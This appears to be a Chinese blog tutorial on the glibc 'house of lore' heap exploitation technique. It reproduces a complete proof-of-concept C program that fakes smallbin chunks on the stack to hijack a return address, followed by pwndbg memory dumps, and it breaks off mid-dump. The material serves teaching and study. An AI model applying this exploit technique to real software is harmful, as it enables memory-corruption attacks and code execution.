    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一小节我们重新说明一下 house of lore 这种攻击方式，黑历史：</p><blockquote><p>上面文章的内容最好别看，因为会污染你的眼睛。</p></blockquote><p>总的来说，house of lore 这种攻击方式主要是修改 smallbin 中 free chunk 的 bk 指针，因为在对 smallbin free chunk 解链时只检查了第一个堆块的双向链表的完整性并没有检查之后 chunk 的堆块链表完整性，这就导致了可以控制任意地址的内存。</p><h1 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a>适用版本</h1><p>glibc 版本&lt; 2.31（该漏洞在最新的 glibc 中已经被封堵–how2heap–这里存疑？？？）</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><h2 id="POC-源码"><a href="#POC-源码" class="headerlink" title="POC 源码"></a>POC 源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">void</span>* fake_freelist[<span class="number">7</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is tested against Ubuntu 18.04.5 - 64bit - glibc-2.27\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating dummy chunks for using up tcache later\n&quot;</span>);</span><br><span class="line">  <span class="keyword">void</span> *dummies[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) dummies[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake free-list on the stack\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line">    fake_freelist[i][<span class="number">3</span>] = fake_freelist[i+<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  fake_freelist[<span class="number">6</span>][<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fake free-list at %p\n&quot;</span>, fake_freelist);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash &quot;</span></span><br><span class="line">          <span class="string">&quot;introduced by smallbin-to-tcache mechanism\n&quot;</span>);</span><br><span class="line">  stack_buffer_2[<span class="number">3</span>] = (<span class="keyword">intptr_t</span> *)fake_freelist[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing dummy chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">free</span>(dummies[i]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now take all dummies chunk in tcache out\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), ≻, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="keyword">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="keyword">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="POC-分析"><a href="#POC-分析" class="headerlink" title="POC 分析"></a>POC 分析</h2><p>首先我们申请了一个大小属于 smallbin 中的 chunk，在 POC 中这里选择创建大小为 0x100 的堆块（b 47-&gt;r）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is tested against Ubuntu 18.04.5 - 64bit - glibc-2.27\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line">#Welcome to the House of Lore</span><br><span class="line">#This is a revisited version that bypass also the hardening check introduced by glibc <span class="built_in">malloc</span></span><br><span class="line">#This is tested against Ubuntu <span class="number">18.04</span><span class="number">.5</span> - <span class="number">64b</span>it - glibc<span class="number">-2.27</span></span><br><span class="line">#</span><br><span class="line">#Allocating the victim chunk</span><br><span class="line">#Allocated the first small chunk on the heap at <span class="number">0x555555757260</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">120</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_victim</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757360</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020ca1</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557573b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>接下来我们再次 malloc7 个与刚才大小相同的堆块（b 52-&gt;c），这里创建 7 个堆块的目的是在后续释放过程中用来填满对应大小的 tcachebin 链表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating dummy chunks for using up tcache later\n&quot;</span>);</span><br><span class="line"><span class="keyword">void</span> *dummies[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) dummies[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">350</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_victim</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757360</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">0</span>]</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757470</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">1</span>]</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757580</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">2</span>]</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757690</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">3</span>]</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557577a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">4</span>]</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557578b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">5</span>]</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557579c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">6</span>]</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757ad0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020531</span> #top_chunk</span><br><span class="line"><span class="number">0x555555757ae0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>此时的 stack_buffer_1 和 stack_buffer_2 的起始地址如下（b 57-&gt;c）:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br><span class="line">#stack_buffer_1 at <span class="number">0x7fffffffdca0</span></span><br><span class="line">#stack_buffer_2 at <span class="number">0x7fffffffdc80</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">350</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_victim</span><br><span class="line">#victim_chunk==<span class="number">0x555555757250</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757360</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">0</span>]</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757470</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">1</span>]</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757580</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">2</span>]</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757690</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">3</span>]</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557577a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">4</span>]</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557578b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">5</span>]</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557579c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">6</span>]</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757ad0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020531</span> #top_chunk</span><br><span class="line"><span class="number">0x555555757ae0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">30</span>gx fake_freelist</span><br><span class="line"><span class="number">0x7fffffffdd00</span>:<span class="number">0x0000000000000000</span><span class="number">0x00007ffff7ffe710</span></span><br><span class="line"><span class="number">0x7fffffffdd10</span>:<span class="number">0x00007ffff7b95707</span><span class="number">0x0000000000000980</span></span><br><span class="line"><span class="number">0x7fffffffdd20</span>:<span class="number">0x00007fffffffdd50</span><span class="number">0x00007fffffffdd60</span></span><br><span class="line"><span class="number">0x7fffffffdd30</span>:<span class="number">0x00007ffff7ffea98</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd40</span>:<span class="number">0x0000004000000000</span><span class="number">0x0000040000000200</span></span><br><span class="line"><span class="number">0x7fffffffdd50</span>:<span class="number">0x00000000ffffffff</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd60</span>:<span class="number">0x00007ffff7ffb2a8</span><span class="number">0x00007ffff7ffe710</span></span><br><span class="line"><span class="number">0x7fffffffdd70</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd80</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd90</span>:<span class="number">0x0000000000000009</span><span class="number">0x00007ffff7dd5660</span></span><br><span class="line"><span class="number">0x7fffffffdda0</span>:<span class="number">0x00007fffffffde08</span><span class="number">0x00000000000000f0</span></span><br><span class="line"><span class="number">0x7fffffffddb0</span>:<span class="number">0x0000000000000001</span><span class="number">0x000055555555502d</span></span><br><span class="line"><span class="number">0x7fffffffddc0</span>:<span class="number">0x00007ffff7de3b40</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffddd0</span>:<span 